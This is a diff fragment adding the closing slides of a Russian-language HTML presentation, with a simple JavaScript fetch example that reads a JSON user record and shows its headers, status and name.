+<section class="slide"><div>
+	<h2>Использование</h2>
+	<pre class="compact">
+	<code>fetch('/user.json')</code>
+	<code>.then(function(response) {</code>
+	<code>	// application/json; charset=utf-8</code>
+	<code>	alert(response.headers.get('Content-Type')); </code>
+	<code>	alert(response.status); // 200</code>
+	<code>	return response.json();</code>
+	<code>})</code>
+	<code>.then(function(user) {</code>
+	<code>	alert(user.name);</code>
+	<code>})</code>
+	<code>.catch( alert );</code>
+	</pre>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>Вопросы?</h2>
+</div></section>
+
+<div class="progress"><div>
+<script src="shower/shower.min.js"></script>
+
+</body>
+</html>
